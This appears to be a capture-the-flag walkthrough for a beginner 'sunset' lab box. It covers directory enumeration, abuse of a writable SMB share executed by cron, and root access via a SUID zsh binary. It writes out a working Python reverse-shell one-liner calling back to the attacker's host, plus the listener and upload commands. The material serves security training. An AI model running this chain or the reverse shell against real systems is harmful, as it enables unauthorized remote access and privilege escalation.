This is the second box in the sunset series. These boxes are great for beginners. This box has smb on it and it is always great to practice with smb.

#### Enumerating:

Using dirb to look for more files on the server:

```
crazyeights@es-base:~$ dirb http://192.168.56.131

```

The directory logs seems promising.

* In management.log we find several usernames: dawn, ganimedes
    
*   We can also see that there is several cron jobs running.

*   The management log is the only one we have permission to access.

### SMB:

**List available shares:**

```
crazyeights@es-base:~$ smbclient -L \\dawn -I 192.168.56.131 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
```

**Connect to the share ITDEPT:**

```
crazyeights@es-base:~$ smbclient \\\\dawn\\ITDEPT -I 192.168.56.131 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug  2 23:23:20 2019
  ..                                  D        0  Fri Aug  2 23:21:39 2019

		7158264 blocks of size 1024. 3478908 blocks available
smb: \> exit
```

**Check if share is writeable:**

```
crazyeights@es-base:~$ smbmap -H 192.168.56.131 -s ITDEPT -d dawn
[+] IP: 192.168.56.131:445	Name: 192.168.56.131

crazyeights@es-base:~$ 
```

Looking back to management.log we can see that the cronjob executed ITDEPT/product-control and wbe-control. We could try to create a script of that name and upload it to the writable share.

```
2020/12/29 18:02:01 [31;1mCMD: UID=1000 PID=859    | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
2020/12/29 18:02:01 [31;1mCMD: UID=33   PID=858    | /bin/sh -c /home/dawn/ITDEPT/web-control [0m
```

Created a file product-control containing python reverse shell

```

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Started a listener

```
crazyeights@es-base:~$ nc -lvp 1234
    listening on [any] 1234 ...
```

Uploaded the file:

```
crazyeights@es-base:~$ smbclient \\\\dawn\\ITDEPT -I 192.168.56.131 -N
Try "help" to get a list of possible commands.
smb: \> put product-control
putting file product-control as \product-control (6.8 kb/s) (average 6.8 kb/s)
smb: \> 
```

*   Now have access as user dawn.

*   Look for commands the user can run with elevated privileges.

```
$ sudo -l
Matching Defaults entries for dawn on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dawn may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/mysql
$   
```

*	Couldn't get this (mysql as root) to work.
    
*   Look for bins the user can run as effective root:
    

```
$ find / -perm -u=s 2>/dev/null
/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/home/dawn/ITDEPT
```

*   Checking gtfo bins

*   zsh allows you to execute commands as a different effective user.

*   Use it to get the root flag:

```
$ zsh 
id
uid=1000(dawn) gid=1000(dawn) euid=0(root) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
cd /root
ls
flag.txt
pspy64
cat flag.txt
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}

Feel like I missed something.

FIN.
